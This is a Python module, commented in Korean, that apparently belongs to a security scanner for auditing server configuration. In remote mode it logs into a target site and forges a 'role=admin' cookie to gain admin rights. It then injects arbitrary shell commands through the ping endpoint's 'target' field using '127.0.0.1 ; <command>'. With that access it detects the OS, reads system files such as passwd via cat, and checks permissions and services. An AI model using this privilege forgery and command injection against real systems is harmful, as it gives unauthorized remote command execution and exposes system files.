import requests
import re
import os
import json
import platform
import subprocess
try:
    from bs4 import BeautifulSoup
except ImportError:
    BeautifulSoup = None

# OS 감지 결과 캐시
_os_cache = {}
_scan_mode = "remote"
_remote_timeout_seconds = 30
_remote_marker_begin = "__SCANNER_CMD_BEGIN__"
_remote_marker_end = "__SCANNER_CMD_END__"
_session_cache = {}
_command_cache = {}

def _make_login_key(login_info):
    if not login_info:
        return None
    try:
        return tuple(sorted(login_info.items()))
    except Exception:
        return str(login_info)

def set_scan_mode(mode):
    global _scan_mode
    if mode in ["remote", "local"]:
        _scan_mode = mode

def get_scan_mode(mode=None):
    if mode in ["remote", "local"]:
        return mode
    return _scan_mode

def is_local_mode(mode=None):
    return get_scan_mode(mode) == "local"

def get_request_timeout(mode=None):
    if is_local_mode(mode):
        return 5
    return _remote_timeout_seconds

def get_session_with_admin_auth(target_url, login_info=None, mode=None):
    """
    로그인 후 admin 권한이 있는 세션 반환
    id가 admin이 아니면 쿠키의 role을 admin으로 변경
    """
    if is_local_mode(mode):
        return None
    cache_key = (target_url, _make_login_key(login_info))
    cached_session = _session_cache.get(cache_key)
    if cached_session:
        return cached_session
    session = requests.Session()
    session.headers.update({'User-Agent': 'SecurityScanner/1.0'})
    
    if login_info:
        try:
            # 로그인 시도
            login_url = f"{target_url}/login"
            response = session.post(login_url, data=login_info, timeout=get_request_timeout(mode))
            
            # 쿠키 확인 및 role 변경
            cookies = session.cookies.get_dict()
            if 'role' in cookies:
                # role이 admin이 아니면 admin으로 변경
                if cookies.get('role') != 'admin':
                    session.cookies.set('role', 'admin')
            else:
                # role 쿠키가 없으면 추가
                session.cookies.set('role', 'admin')
            
            # username이 admin이 아니면 role을 admin으로 설정
            if login_info.get('username') != 'admin':
                session.cookies.set('role', 'admin')
                
        except Exception as e:
            pass
    
    _session_cache[cache_key] = session
    return session

def detect_os(target_url, session, mode=None):
    """
    /admin/system/ping을 통해 OS 감지 (한 번만 실행, 결과 캐시)
    Windows인지 Linux인지 확인
    """
    if is_local_mode(mode):
        system_name = platform.system().lower()
        if "windows" in system_name:
            return "Windows"
        return "Linux"
    # 캐시 키 생성
    cache_key = target_url
    
    # 캐시에 있으면 재사용
    if cache_key in _os_cache:
        return _os_cache[cache_key]
    
    try:
        # Windows 명령으로 OS 확인 시도
        ping_url = f"{target_url}/admin/system/ping"
        test_commands = [
            ("ver", "Windows"),  # Windows 버전 확인
            ("uname -a", "Linux"),  # Linux 정보 확인
        ]
        
        for cmd, expected_os in test_commands:
            try:
                data = {'target': f'127.0.0.1 ; {cmd}'}
                response = session.post(ping_url, data=data, timeout=get_request_timeout(mode))
                
                if expected_os == "Windows":
                    # Windows 특정 문자열 확인
                    if any(keyword in response.text for keyword in ['Windows', 'Microsoft', 'Version']):
                        _os_cache[cache_key] = "Windows"
                        return "Windows"
                elif expected_os == "Linux":
                    # Linux 특정 문자열 확인
                    if any(keyword in response.text for keyword in ['Linux', 'GNU', 'kernel']):
                        _os_cache[cache_key] = "Linux"
                        return "Linux"
            except:
                continue
        
        # 기본값으로 Linux 가정 (일반적으로 웹 서버는 Linux)
        _os_cache[cache_key] = "Linux"
        return "Linux"
    except:
        # 기본값으로 Linux 가정
        _os_cache[cache_key] = "Linux"
        return "Linux"

def execute_command(target_url, session, command, mode=None):
    """
    /admin/system/ping에 POST 요청으로 명령 실행
    HTML 응답에서 실제 명령어 실행 결과만 파싱하여 반환
    """
    if is_local_mode(mode):
        return execute_local_command(command)
    try:
        cache_key = (target_url, get_scan_mode(mode), command)
        cached = _command_cache.get(cache_key)
        if cached is not None:
            return cached
        remote_command = command
        if _remote_marker_begin not in command and _remote_marker_end not in command:
            remote_command = (
                f'printf "%s\\n" "{_remote_marker_begin}"; '
                f'{command}; '
                f'printf "%s\\n" "{_remote_marker_end}"'
            )
        ping_url = f"{target_url}/admin/system/ping"
        data = {'target': f'127.0.0.1 ; {remote_command}'}
        response = session.post(ping_url, data=data, timeout=get_request_timeout(mode))
        html_content = response.text
        
        # HTML에서 <pre> 태그 내부의 실제 결과만 추출
        # ping 결과와 명령어 실행 결과가 함께 있을 수 있으므로 파싱
        try:
            if BeautifulSoup:
                soup = BeautifulSoup(html_content, 'html.parser')
                # Console Output 섹션의 <pre> 태그 찾기
                pre_tags = soup.find_all('pre')
                
                if pre_tags:
                    # 마지막 <pre> 태그가 실제 명령어 실행 결과일 가능성이 높음
                    result_text = pre_tags[-1].get_text(strip=False)
                else:
                    # <pre> 태그가 없으면 원본 반환
                    return html_content
            else:
                # BeautifulSoup가 없으면 정규식으로 <pre> 태그 내용 추출
                pre_match = re.search(r'<pre[^>]*>(.*?)</pre>', html_content, re.DOTALL)
                if pre_match:
                    result_text = pre_match.group(1)
                    # HTML 엔티티 디코딩
                    result_text = result_text.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&')
                else:
                    return html_content
            
            if _remote_marker_begin in result_text and _remote_marker_end in result_text:
                extracted = result_text.split(_remote_marker_begin, 1)[1]
                extracted = extracted.split(_remote_marker_end, 1)[0]
                result = extracted.strip()
                _command_cache[cache_key] = result
                return result

            # ping 결과 제거 (ping -c 3 또는 ping 결과 패턴 제거)
            # ping 결과는 보통 "PING", "bytes from", "packet loss" 등의 패턴을 포함
            lines = result_text.split('\n')
            filtered_lines = []
            skip_ping = False

            for line in lines:
                # ping 결과 시작 패턴 감지
                if re.match(r'^PING\s+', line) or 'bytes from' in line or 'packet loss' in line:
                    skip_ping = True
                    continue
                # ping 결과 종료 패턴 (통계 정보)
                if skip_ping and (re.match(r'^\d+\s+packets', line) or 'rtt min/avg/max' in line or 'round-trip' in line or 'statistics' in line.lower()):
                    skip_ping = False
                    continue
                # ping 결과 중간 라인 스킵
                if skip_ping:
                    continue

                filtered_lines.append(line)

            result = '\n'.join(filtered_lines).strip()

            # 결과가 비어있으면 원본 반환
            if result:
                _command_cache[cache_key] = result
                return result
            _command_cache[cache_key] = result_text
            return result_text
                
        except Exception:
            # 파싱 실패 시 원본 반환
            _command_cache[cache_key] = html_content
            return html_content
            
    except Exception as e:
        error_result = f"Error: {str(e)}"
        _command_cache[cache_key] = error_result
        return error_result

def execute_local_command(command):
    try:
        result = subprocess.run(
            command,
            shell=True,
            check=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        output = (result.stdout or "") + (result.stderr or "")
        return output.strip()
    except Exception as e:
        return f"Error: {str(e)}"

def read_file(target_url, session, file_path, mode=None):
    if is_local_mode(mode):
        try:
            with open(file_path, 'r', encoding='utf-8', errors='replace') as f:
                return f.read()
        except Exception as e:
            return f"Error: {str(e)}"
    return execute_command(target_url, session, f"cat {file_path} 2>&1", mode=mode)

def get_file_stat(target_url, session, file_path, mode=None):
    output = execute_command(target_url, session, f"stat -c '%U %G %a' {file_path} 2>&1", mode=mode)
    if not output or "No such file" in output or "cannot stat" in output or output.startswith("Error:"):
        return None
    parts = output.strip().split()
    if len(parts) < 3:
        return None
    return {
        "owner": parts[0],
        "group": parts[1],
        "perm": parts[2],
    }

def parse_passwd(content):
    entries = []
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split(':')
        if len(parts) < 7:
            continue
        try:
            uid = int(parts[2])
        except ValueError:
            uid = None
        try:
            gid = int(parts[3])
        except ValueError:
            gid = None
        entries.append({
            "name": parts[0],
            "uid": uid,
            "gid": gid,
            "home": parts[5],
            "shell": parts[6],
        })
    return entries

def parse_group(content):
    entries = []
    for line in content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'):
            continue
        parts = line.split(':')
        if len(parts) < 4:
            continue
        try:
            gid = int(parts[2])
        except ValueError:
            gid = None
        members = [m for m in parts[3].split(',') if m] if parts[3] else []
        entries.append({
            "name": parts[0],
            "gid": gid,
            "members": members,
        })
    return entries

def check_file_permissions(target_url, session, file_path, os_type):
    """
    파일 권한 확인 (Linux만 지원)
    """
    if os_type != "Linux":
        return "Error: Windows는 지원하지 않습니다"
    command = f"ls -l {file_path} 2>&1"
    result = execute_command(target_url, session, command)
    return result

def check_service_status(target_url, session, service_name, os_type):
    """
    서비스 상태 확인 (Linux만 지원)
    """
    if os_type != "Linux":
        return "Error: Windows는 지원하지 않습니다"
    command = f"systemctl is-active {service_name} 2>&1"
    result = execute_command(target_url, session, command)
    return result
